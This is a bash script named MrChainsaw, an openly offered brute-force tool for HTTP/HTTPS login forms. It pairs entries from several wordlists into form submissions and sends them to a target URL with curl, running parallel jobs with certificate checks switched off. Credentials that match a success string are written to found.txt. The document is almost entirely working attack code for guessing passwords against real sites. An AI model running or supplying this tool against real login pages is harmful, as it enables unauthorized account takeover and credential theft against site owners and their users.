#!/bin/bash

# ===================== HELP =====================
if [[ "$1" == "--help" || $# -lt 5 ]]; then
  echo "MrChainsaw v1.0 - Intelligent brute force for HTTP/HTTPS login"
  echo
  echo "<< Part of the DYSØRDER project >> | By simplyYan"
  echo
  echo "Usage: $0 --url URL --fields field1,field2,... --wordlists list1.txt,list2.txt --success \"SuccessText\" [--method POST|GET] [--headers \"header1:value\"] [--cookies \"cookie1=value\"] [--delay 0.5] [--threads 10]"
  echo
  echo "Example:"
  echo "$0 --url https://example.com/login --fields username,password --wordlists users.txt,pass.txt --success \"Welcome\" --method POST --delay 0.5 --threads 5"
  exit 1
fi

# ===================== INITIAL VARIABLES =====================
# Input parameters
URL=""
FIELD_NAMES=()
WORDLISTS=()
SUCCESS_PATTERN=""
METHOD="POST"
DELAY=0
THREADS=1
HEADERS=""
COOKIES=""

# ===================== PARSING PARAMETERS =====================
while [[ $# -gt 0 ]]; do
  case "$1" in
    --url)
      URL="$2"; shift 2 ;;
    --fields)
      IFS=',' read -r -a FIELD_NAMES <<< "$2"; shift 2 ;;
    --wordlists)
      IFS=',' read -r -a WORDLISTS <<< "$2"; shift 2 ;;
    --success)
      SUCCESS_PATTERN="$2"; shift 2 ;;
    --method)
      METHOD="$2"; shift 2 ;;
    --delay)
      DELAY="$2"; shift 2 ;;
    --threads)
      THREADS="$2"; shift 2 ;;
    --headers)
      HEADERS="$2"; shift 2 ;;
    --cookies)
      COOKIES="$2"; shift 2 ;;
    *)
      echo "Invalid argument: $1"; exit 1 ;;
  esac
done

# ===================== INITIAL VALIDATIONS =====================
if [[ -z "$URL" || -z "$SUCCESS_PATTERN" ]]; then
  echo "Error: --url and --success are required."
  exit 1
fi

if [[ ${#FIELD_NAMES[@]} -ne ${#WORDLISTS[@]} ]]; then
  echo "Error: Number of fields does not match the number of wordlists."
  exit 1
fi

for w in "${WORDLISTS[@]}"; do
  if [[ ! -f "$w" ]]; then
    echo "Error: Wordlist '$w' not found."
    exit 1
  fi
done

# ===================== LOAD WORDLISTS =====================
mapfile -t FIELD_VALUES < <(paste -d '|' "${WORDLISTS[@]}")

# ===================== FUNCTION: SEND REQUEST =====================
send_request() {
  local post_data=""
  
  for i in "${!FIELD_NAMES[@]}"; do
    k="${FIELD_NAMES[$i]}"
    v="${values[$i]}"
    post_data+="${k}=$(printf '%s' "$v" | jq -sRr @uri)&"
  done
  post_data="${post_data%&}"
  
  curl_args=(-sk)
  
  # Add headers and cookies if defined
  [[ -n "$HEADERS" ]] && curl_args+=($(sed 's/^/-H "/;s/$/"/' <<< "$HEADERS"))
  [[ -n "$COOKIES" ]] && curl_args+=(-H "Cookie: $COOKIES")
  
  # Send POST or GET request
  if [[ "$METHOD" == "POST" ]]; then
    response=$(curl "${curl_args[@]}" -X POST -d "$post_data" "$URL")
  else
    response=$(curl "${curl_args[@]}" -G --data "$post_data" "$URL")
  fi

  echo "$response"
}

# ===================== FUNCTION: CHECK SUCCESS =====================
check_success() {
  local response="$1"
  if echo "$response" | grep -q "$SUCCESS_PATTERN"; then
    echo "[+] Success with data: $post_data"
    echo "$post_data" >> found.txt  # Save success to a file
    return 0
  fi
  return 1
}

# ===================== FUNCTION: EXECUTE TASKS WITH THREADS =====================
attempt_login() {
  IFS='|' read -r -a values <<< "$1"
  
  post_data=""
  for i in "${!FIELD_NAMES[@]}"; do
    k="${FIELD_NAMES[$i]}"
    v="${values[$i]}"
    post_data+="${k}=$(printf '%s' "$v" | jq -sRr @uri)&"
  done
  post_data="${post_data%&}"
  
  echo "[*] Trying: $post_data"
  response=$(send_request "$post_data")
  
  if check_success "$response"; then
    exit 0
  fi
}

# ===================== EXECUTE BRUTE FORCE =====================
echo "Starting MrChainsaw v1.0..."

current_thread=0
for line in "${FIELD_VALUES[@]}"; do
  # Run attempts with threads
  attempt_login "$line" &
  ((current_thread++))
  
  # Wait for threads to reach the limit
  if ((current_thread >= THREADS)); then
    wait
    current_thread=0
  fi
  
  # Delay between attempts
  sleep "$DELAY"
done

# Wait for final threads
wait
echo "[-] No successful combinations found."
exit 1